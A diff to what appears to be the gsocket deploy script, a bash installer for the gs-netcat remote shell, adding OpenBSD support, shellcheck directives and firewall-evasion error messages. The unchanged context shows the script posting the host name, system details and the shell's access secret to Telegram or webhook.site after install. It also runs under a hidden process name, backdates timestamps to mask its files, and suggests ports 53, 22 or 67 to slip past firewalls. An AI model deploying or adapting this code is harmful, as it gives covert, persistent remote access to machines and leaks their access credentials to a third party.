@@ -76,6 +76,7 @@ GS_WEBHOOK_404_OK=
 unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
+# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
 # GS_TG_TOKEN="5794110125:AAFDNb..."
@@ -92,6 +93,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### webhook.site
 # GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
@@ -261,6 +263,7 @@ _ts_get_ts()
 	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
 
 	# Take ts from oldest file in directory
+	# shellcheck disable=SC2012 #Use find instead of ls => not portable
 	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
 	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
 }
@@ -563,6 +566,7 @@ init_vars()
 {
 	# Select binary
 	local arch
+	local osname
 	arch=$(uname -m)
 
 	if [[ -z "$HOME" ]]; then
@@ -581,6 +585,8 @@ init_vars()
 			OSTYPE="FreeBSD"
 		elif [[ "$osname" == *Darwin* ]]; then
 			OSTYPE="darwin22.0"
+		elif [[ "$osname" == *OpenBSD* ]]; then
+			OSTYPE="openbsd7.3"
 		elif [[ "$osname" == *Linux* ]]; then
 			OSTYPE="linux-gnu"
 		fi
@@ -613,9 +619,11 @@ init_vars()
 			else
 				OSARCH="x86_64-osx"
 			fi
-		elif [[ $OSTYPE == *FreeBSD* ]]; then
+		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
 				OSARCH="x86_64-freebsd"
-		elif [[ $OSTYPE == *cygwin* ]]; then
+		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
+				OSARCH="x86_64-openbsd"
+		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
 			OSARCH="i686-cygwin"
 			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
 		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
@@ -742,7 +750,7 @@ init_vars()
 	fi
 
 	[[ $SHELL == *"nologin"* ]] && unset SHELL
-	
+
 	DEBUGF "OLD_PIDS='$OLD_PIDS'"
 	DEBUGF "SRC_PKG=$SRC_PKG"
 }
@@ -1297,6 +1305,7 @@ test_bin()
 
 test_network()
 {
+	local ret
 	unset IS_TESTNETWORK_OK
 
 	# There should be no GS-NETCAT listening.
@@ -1307,7 +1316,7 @@ test_network()
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
 	# Do not need GS_ENV[*] here because all env variables are exported
 	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1323,7 +1332,16 @@ test_network()
 		FAIL_OUT
 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 		# EXIT if we can not check if SECRET has already been used.
-		errexit "Cannot connect to GSRN. Firewalled?"
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
+	}
+
+	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
+	# >1.4.40 return 203 (NETERROR)
+	[[ $ret -eq 255 ]] && {
+		# Connect reset by peer
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
 	}
 
 	[[ $ret -eq 0 ]] && {
@@ -1357,7 +1375,9 @@ do_webhook()
 	while [[ $# -gt 0 ]]; do
 		# We need to escape all " to "'"'" to pass 'eval' correctly.
 		# (Note: This _WILL_ expand $-style variables - what we want)
-		str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
+		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		str="${1//\"/\"'\"'\"}"
         eval str=\""$str"\"
 		arr+=("$str")
 		shift 1
